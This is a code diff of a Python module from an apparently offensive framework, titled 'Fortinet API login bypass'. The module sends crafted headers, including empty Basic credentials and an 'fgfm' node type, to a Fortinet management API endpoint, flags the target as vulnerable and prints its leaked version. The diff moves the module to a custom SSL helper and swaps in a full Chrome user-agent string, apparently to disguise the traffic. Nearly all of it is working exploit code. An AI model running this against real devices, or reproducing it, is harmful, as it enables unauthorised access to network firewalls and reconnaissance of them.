@@ -1,5 +1,5 @@
-import requests
 import urllib3
+from lib.smf.ssl.netssl import *
 
 MOD_INFO = {
     "Name": "Fortinet API login bypass",
@@ -26,19 +26,19 @@ def execute(options):
 
     url = f"https://{target}:{port}/api/v2/monitor/system/status"
     headers = {
-        "User-Agent": "Mozilla/5.0",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
         "Node-Id": "1",
         "Node-Type": "fgfm",
         "Authorization": "Basic Og==",
     }
 
     try:
-        response = requests.get(url, headers=headers, verify=False, timeout=10)
-        if response.status_code == 200 and "version" in response.text.lower():
+        res = storm_ssl("GET", url, headers=headers)
+        if res.status_code == 200 and "version" in res.text.lower():
             print(f"{'='*40}")
             print(f"[!] VULNERABLE: {target}")
             print(
-                f"[+] System Info: {response.json().get('results', {}).get('version', 'N/A')}"
+                f"[+] System Info: {res.json().get('results', {}).get('version', 'N/A')}"
             )
             print(f"{'='*40}")
         else:
